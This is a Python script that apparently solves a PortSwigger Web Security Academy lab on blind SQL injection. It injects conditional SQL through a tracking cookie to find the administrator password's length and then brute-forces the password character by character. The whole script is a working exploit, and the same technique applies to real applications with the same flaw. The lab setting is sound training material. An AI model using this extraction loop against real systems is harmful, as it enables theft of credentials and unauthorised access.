# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

# This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.
# The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
# To solve the lab, log in as the administrator user.

import requests
import string


url = 'https://0a3300df035820b780dc300700e60070.web-security-academy.net/'

tid='fhVrM5kwBVPIvq9S'


cookie={"TrackingId":tid}

response = requests.get(url,cookies=cookie)

if "Welcome" in response.text:
    print("[+] Testing successfully")

length_pass=0

for i in range(101):
    # print("[-] finding the lenght of password with",i)
    tid = f"fhVrM5kwBVPIvq9S' and (select LENGTH(password) from users where username='administrator')={i}--"
    cookie={"TrackingId":tid}
    response = requests.get(url,cookies=cookie)
    
    if "Welcome" in response.text:
        length_pass=i
        break
print("[!] boom! we have found that:",length_pass)

txt = string.ascii_lowercase+string.digits

pass_admin=''

for i in range(1,length_pass+1):
    for j in txt:
        pass_admin+=j
        tid = f"fhVrM5kwBVPIvq9S' and (select SUBSTRING(password,1,{i}) from users where username='administrator')= '{pass_admin}"
        cookie={"TrackingId":tid}
        response = requests.get(url,cookies=cookie)
        if "Welcome" in response.text:
            print("[!!!] we have found sub password : ",pass_admin)
            break
        else:
            pass_admin=pass_admin[:-1]
print("[++] full password",pass_admin)
